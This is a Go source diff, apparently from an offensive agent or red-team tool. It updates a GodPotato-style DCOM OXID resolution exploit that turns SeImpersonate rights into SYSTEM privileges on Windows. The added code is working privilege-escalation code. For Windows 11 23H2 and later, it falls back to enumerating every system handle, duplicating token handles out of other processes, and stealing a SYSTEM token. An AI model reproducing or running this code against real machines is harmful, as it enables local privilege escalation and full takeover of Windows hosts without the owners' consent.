@@ -22,8 +22,10 @@ import (
 
 // GodPotato-style DCOM OXID resolution abuse for SeImpersonate → SYSTEM.
 // This technique hooks the RPC dispatch table in combase.dll to redirect
-// OXID resolution to an attacker-controlled named pipe. When RPCSS (SYSTEM)
-// connects to resolve the OXID, we impersonate its token.
+// OXID resolution to an attacker-controlled named pipe. When RPCSS connects
+// to resolve the OXID, we impersonate its token. On older Windows RPCSS
+// runs as SYSTEM (direct escalation). On Win11 23H2+ RPCSS runs as
+// NETWORK SERVICE, so we fall back to system-wide token search.
 //
 // References:
 // - https://github.com/BeichenDream/GodPotato
@@ -695,15 +697,29 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 			clientIdentities = append(clientIdentities, clientIdentity)
 
 			if !isSystem {
+				// Not SYSTEM — try token search fallback (GodPotato approach).
+				// On Win11 23H2+, RPCSS runs as NETWORK SERVICE so the pipe
+				// client won't be SYSTEM. Search for a SYSTEM token while
+				// still impersonating the pipe client (may grant extra access).
+				searchTok, searchInfo, searchErr := searchSystemTokenViaHandles()
 				threadToken.Close()
 				procRevertToSelf.Call()
 				procDisconnectNamedPipe.Call(hPipe)
+
+				if searchErr == nil && searchTok != 0 {
+					dupToken = searchTok
+					clientIdentity = fmt.Sprintf("token search: %s (pipe was %s)", searchInfo, clientIdentity)
+					gotSystem = true
+					break
+				}
+
+				// Token search failed — continue checking other pipe instances
 				windows.ResetEvent(pipes[i].event)
 				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
 				continue
 			}
 
-			// Got SYSTEM! Duplicate to primary token
+			// Got SYSTEM directly from pipe! Duplicate to primary token
 			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
 				windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
 			if err != nil {
@@ -1030,8 +1046,8 @@ func triggerOXIDResolution(oxid [8]byte, oid [8]byte, ipid [16]byte) error {
 	// This causes COM to contact RPCSS to resolve the OXID.
 	// Since the DUALSTRINGARRAY specifies TCP (which we haven't registered),
 	// RPCSS calls the ORCB UseProtSeq callback (which we hooked) to ask us
-	// to register TCP. Our hook returns a pipe binding, and RPCSS (SYSTEM)
-	// connects to our named pipe.
+	// to register TCP. Our hook returns a pipe binding, and RPCSS connects
+	// to our named pipe (SYSTEM on old Windows, NETWORK SERVICE on Win11+).
 	var punk uintptr
 	ret, _, _ := procCoUnmarshalIntf.Call(
 		stream,
@@ -1155,4 +1171,161 @@ func createOBJREFStream(objrefData []byte) (uintptr, func(), error) {
 	}
 
 	return 0, nil, fmt.Errorf("SHCreateMemStream not available")
+}
+
+// searchSystemTokenViaHandles implements the GodPotato token search fallback.
+// When the pipe client is not SYSTEM (e.g., NETWORK SERVICE on Win11 23H2),
+// this function enumerates all system handles to find a SYSTEM token.
+// Must be called while impersonating the pipe client (for any additional access
+// the impersonated identity may provide).
+func searchSystemTokenViaHandles() (windows.Token, string, error) {
+	systemSID, _ := windows.StringToSid("S-1-5-18")
+	myPID := uint32(syscall.Getpid())
+	myProcess, _ := windows.GetCurrentProcess()
+
+	// Enumerate all system handles
+	entries, err := querySystemHandles()
+	if err != nil {
+		return 0, "", fmt.Errorf("querySystemHandles: %w", err)
+	}
+
+	// Group by PID and track which PIDs we've tried
+	triedPIDs := make(map[uint32]bool)
+	var found windows.Token
+	var foundInfo string
+
+	// First pass: try OpenProcess + OpenProcessToken on each unique PID.
+	// This is the simplest approach — if we can open the process and its token
+	// is SYSTEM, we can duplicate it directly.
+	for _, entry := range entries {
+		pid := entry.OwnerPID
+		if pid == 0 || pid == 4 || pid == myPID || triedPIDs[pid] {
+			continue
+		}
+		triedPIDs[pid] = true
+
+		hProc, procErr := windows.OpenProcess(
+			PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+		if procErr != nil {
+			continue
+		}
+
+		var tok windows.Token
+		tokErr := windows.OpenProcessToken(hProc, TOKEN_QUERY|TOKEN_DUPLICATE, &tok)
+		windows.CloseHandle(hProc)
+		if tokErr != nil {
+			continue
+		}
+
+		tu, tuErr := tok.GetTokenUser()
+		if tuErr != nil || !tu.User.Sid.Equals(systemSID) {
+			tok.Close()
+			continue
+		}
+
+		// Found a SYSTEM token — duplicate it
+		var dupTok windows.Token
+		dupErr := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
+			windows.SecurityDelegation, windows.TokenPrimary, &dupTok)
+		if dupErr != nil {
+			dupErr = windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
+				windows.SecurityImpersonation, windows.TokenImpersonation, &dupTok)
+		}
+		tok.Close()
+		if dupErr != nil {
+			continue
+		}
+
+		found = dupTok
+		foundInfo = fmt.Sprintf("process token (PID %d)", pid)
+		break
+	}
+
+	if found != 0 {
+		return found, foundInfo, nil
+	}
+
+	// Second pass: try DuplicateHandle on individual token handles.
+	// Some processes may hold SYSTEM token handles even if we can't open
+	// the process's own token. We duplicate each handle and check the token.
+	triedPIDs = make(map[uint32]bool) // reset for process handle cache
+	var processHandleCache = make(map[uint32]windows.Handle)
+	defer func() {
+		for _, h := range processHandleCache {
+			windows.CloseHandle(h)
+		}
+	}()
+
+	for _, entry := range entries {
+		pid := entry.OwnerPID
+		if pid == 0 || pid == 4 || pid == myPID {
+			continue
+		}
+
+		// Try to open the owning process (cache the handle)
+		if _, ok := processHandleCache[pid]; !ok {
+			if triedPIDs[pid] {
+				continue
+			}
+			triedPIDs[pid] = true
+			hProc, procErr := windows.OpenProcess(
+				processDupHandle|PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+			if procErr != nil {
+				continue
+			}
+			processHandleCache[pid] = hProc
+		}
+
+		hProc := processHandleCache[pid]
+
+		// Skip handles with GrantedAccess that commonly cause hangs
+		if entry.GrantedAccess == 0x0012019f {
+			continue
+		}
+
+		// Try to duplicate the handle into our process
+		var dupHandle windows.Handle
+		ret, _, _ := procNtDuplicateObjHandles.Call(
+			uintptr(hProc),
+			uintptr(entry.HandleValue),
+			uintptr(myProcess),
+			uintptr(unsafe.Pointer(&dupHandle)),
+			uintptr(TOKEN_QUERY|TOKEN_DUPLICATE),
+			0, // no inherit
+			0, // no options (don't close source)
+		)
+		if ret != 0 || dupHandle == 0 {
+			continue
+		}
+
+		// Check if this is a token by trying GetTokenUser
+		tok := windows.Token(dupHandle)
+		tu, tuErr := tok.GetTokenUser()
+		if tuErr != nil {
+			windows.CloseHandle(dupHandle)
+			continue
+		}
+
+		if !tu.User.Sid.Equals(systemSID) {
+			tok.Close()
+			continue
+		}
+
+		// Found a SYSTEM token handle — duplicate it properly
+		var finalTok windows.Token
+		dupErr := windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
+			windows.SecurityDelegation, windows.TokenPrimary, &finalTok)
+		if dupErr != nil {
+			dupErr = windows.DuplicateTokenEx(tok, windows.MAXIMUM_ALLOWED, nil,
+				windows.SecurityImpersonation, windows.TokenImpersonation, &finalTok)
+		}
+		tok.Close()
+		if dupErr != nil {
+			continue
+		}
+
+		return finalTok, fmt.Sprintf("handle dup (PID %d, handle 0x%x)", pid, entry.HandleValue), nil
+	}
+
+	return 0, "", fmt.Errorf("no SYSTEM token found via handle enumeration (%d handles, %d unique PIDs)", len(entries), len(triedPIDs))
 }
